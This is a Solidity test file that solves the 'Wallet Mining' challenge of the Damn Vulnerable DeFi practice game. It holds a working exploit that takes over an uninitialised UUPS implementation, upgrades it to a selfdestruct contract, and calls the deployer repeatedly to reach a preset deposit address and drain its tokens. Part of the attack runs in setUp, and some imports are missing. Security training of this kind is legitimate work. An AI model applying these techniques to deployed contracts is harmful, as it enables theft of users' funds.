// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../DamnValuableToken.sol";
import "../../wallet-mining/AuthorizerUpgradeable.sol";
import "../../wallet-mining/WalletDeployer.sol";

import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract WalletMiningTest is BaseTest {
    address constant DEPOSIT_ADDRESS =
        0x9B6fb606A9f5789444c17768c6dFCF2f83563801;

    address constant GNOSIS_EOA_ADDRESS =
        0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A;

    address constant GNOSIS_SAFE__FACTORY_ADDRESS =
        0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B;

    address constant GNOSIS_SAFE__MASTERCOPY_ADDRESS =
        0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F;

    uint256 constant INITIAL_WALLET_TOKEN_BALANCE = 20_000_000 ether;
    uint256 constant INITIAL_WALLET_DEPLOLYER_TOKEN_BALANCE = 43 ether;
    uint256 constant REWARD = 1 ether;

    address attacker;
    address deployer;
    address ward;

    WalletDeployer walletDeployer;
    AuthorizerUpgradeable authorizerUpgradeableLogic;
    ERC1967Proxy authorizerUpgradeableProxy;

    DamnValuableToken token;
    DamnValuableToken mastercopy;

    constructor() {
        string[] memory labels = new string[](4);
        labels[0] = "attacker";
        labels[1] = "deployer";
        labels[2] = "ward";

        preSetup(3, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];
        deployer = users[1];
        ward = users[2];

        token = new DamnValuableToken();
        vm.label(address(token), "DamnValuableToken");

        vm.startPrank(deployer);
        authorizerUpgradeableLogic = new AuthorizerUpgradeable();
        vm.label(
            address(authorizerUpgradeableLogic),
            "authorizerUpgradeableLogic"
        );

        authorizerUpgradeableProxy = new ERC1967Proxy(
            address(authorizerUpgradeableLogic),
            ""
        );
        vm.label(
            address(authorizerUpgradeableProxy),
            "authorizerUpgradeableProxy"
        );

        // address[][2] memory addressesInit;
        address[] memory wardArr = new address[](1);
        wardArr[0] = ward;
        address[] memory depArr = new address[](1);
        depArr[0] = DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(address(authorizerUpgradeableProxy)).init(
            wardArr,
            depArr
        );

        walletDeployer = new WalletDeployer(address(token));
        vm.stopPrank();

        assertEq(
            AuthorizerUpgradeable(address(authorizerUpgradeableProxy)).owner(),
            deployer
        );
        assertEq(
            AuthorizerUpgradeable(address(authorizerUpgradeableProxy)).can(
                ward,
                DEPOSIT_ADDRESS
            ),
            true
        );
        assertEq(
            AuthorizerUpgradeable(address(authorizerUpgradeableProxy)).can(
                attacker,
                DEPOSIT_ADDRESS
            ),
            false
        );

        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));

        vm.startPrank(deployer);
        walletDeployer.rule(address(authorizerUpgradeableProxy));
        assertEq(walletDeployer.mom(), address(authorizerUpgradeableProxy));

        vm.stopPrank();
        assertEq(walletDeployer.can(ward, DEPOSIT_ADDRESS), true);
        // vm.expectRevert();
        // walletDeployer.can(attacker, DEPOSIT_ADDRESS);

        token.transfer(
            address(walletDeployer),
            INITIAL_WALLET_DEPLOLYER_TOKEN_BALANCE
        );

        assertEq(DEPOSIT_ADDRESS.code.length, 0);
        assertEq(address(walletDeployer.fact()).code.length, 0);
        assertEq(address(walletDeployer.copy()).code.length, 0);

        assertEq(
            token.balanceOf(address(walletDeployer)),
            INITIAL_WALLET_DEPLOLYER_TOKEN_BALANCE
        );
        assertEq(token.balanceOf(attacker), 0);

        address searchAddr;
        address depositAddr;
        uint256 nonce; //43
        GnosisSafeProxyFactory factory; // 2
        // 0
        // createProxy(address singleton, bytes memory data)

        vm.startPrank(GNOSIS_EOA_ADDRESS);

        for (uint256 i; i < 100; ++i) {
            if (i == 0) {
                mastercopy = new DamnValuableToken();
                vm.label(address(mastercopy), "DamnValuableToken2");
            }
            if (i == 1) {
                searchAddr = address(new DamnValuableToken());
                delete searchAddr;
            }
            if (i == 2) {
                factory = new GnosisSafeProxyFactory();
                break;
            }
        }
        mastercopy.transfer(DEPOSIT_ADDRESS, INITIAL_WALLET_TOKEN_BALANCE);
        assertEq(address(factory), GNOSIS_SAFE__FACTORY_ADDRESS);
        assertEq(address(mastercopy), GNOSIS_SAFE__MASTERCOPY_ADDRESS);

        vm.deal(GNOSIS_EOA_ADDRESS, 100 ether);

        vm.stopPrank();

        assertEq(address(mastercopy), GNOSIS_SAFE__MASTERCOPY_ADDRESS);

        vm.startPrank(attacker);

        address[] memory wardArr2 = new address[](43);
        for (uint256 i; i < 43; ++i) {
            wardArr2[i] = attacker;
        }

        address[] memory depArr2 = new address[](43);
        for (uint256 i; i < 43; ++i) {
            depArr2[i] = 0x04678C6e1E0b1a2632Ff85B78610a0A41418C5Ed;
        }
        authorizerUpgradeableLogic.init(wardArr2, depArr2);

        assertEq(authorizerUpgradeableLogic.owner(), attacker);

        address payable selfdestructContract = payable(
            address(new SelfdestructContract())
        );
        authorizerUpgradeableLogic.upgradeToAndCall(
            selfdestructContract,
            abi.encodeWithSignature("attack()")
        );
        vm.stopPrank();
    }

    function test_ExploitWalletMining() public {
        runTest();
    }

    function exploit() internal override {
        vm.startPrank(attacker);
        address aim;
        for (uint256 i; i < 43; ++i) {
            if (i != 42) {
                aim = walletDeployer.drop("");
            }
            if (i == 42) {
                aim = walletDeployer.drop("");
            }
            if (aim == DEPOSIT_ADDRESS) {
                break;
            }
        }
        assertEq(aim, DEPOSIT_ADDRESS);
        assertEq(mastercopy.balanceOf(aim), INITIAL_WALLET_TOKEN_BALANCE);
        assertEq(
            mastercopy.balanceOf(DEPOSIT_ADDRESS),
            INITIAL_WALLET_TOKEN_BALANCE
        );
        assertEq(mastercopy.balanceOf(attacker), 0);

        address(aim).call(abi.encodeWithSignature("balanceOf(address)", aim));
        address(aim).call(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        vm.stopPrank();

        vm.startPrank(aim);
        mastercopy.transfer(attacker, INITIAL_WALLET_TOKEN_BALANCE);
        vm.stopPrank();
    }

    function success() internal override {
        assertEq(token.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(token.balanceOf(address(walletDeployer)), 0);
        assertEq(
            token.balanceOf(attacker),
            INITIAL_WALLET_DEPLOLYER_TOKEN_BALANCE
        );

        assertEq(mastercopy.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(mastercopy.balanceOf(attacker), INITIAL_WALLET_TOKEN_BALANCE);
    }
}

contract SelfdestructContract is
    Initializable,
    OwnableUpgradeable,
    UUPSUpgradeable
{
    // mapping(address => mapping(address => uint256)) private wards;

    // event Rely(address indexed usr, address aim);

    // function init(address[] memory _wards, address[] memory _aims)
    //     external
    //     initializer
    // {
    //     __Ownable_init();
    //     __UUPSUpgradeable_init();

    //     for (uint256 i = 0; i < _wards.length; ) {
    //         _rely(_wards[i], _aims[i]);
    //         unchecked {
    //             i++;
    //         }
    //     }
    // }

    // function _rely(address usr, address aim) private {
    //     wards[usr][aim] = 1;
    //     emit Rely(usr, aim);
    // }

    // function can(address usr, address aim) external view returns (bool) {
    //     return wards[usr][aim] == 1;
    // }

    // function upgradeToAndCall(address imp, bytes memory wat)
    //     external
    //     payable
    //     override
    // {
    //     _authorizeUpgrade(imp);
    //     _upgradeToAndCallUUPS(imp, wat, true);
    // }

    function _authorizeUpgrade(address imp) internal override onlyOwner {}

    function test() external view returns (uint256) {
        return 123;
    }

    function attack() public {
        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {}
}
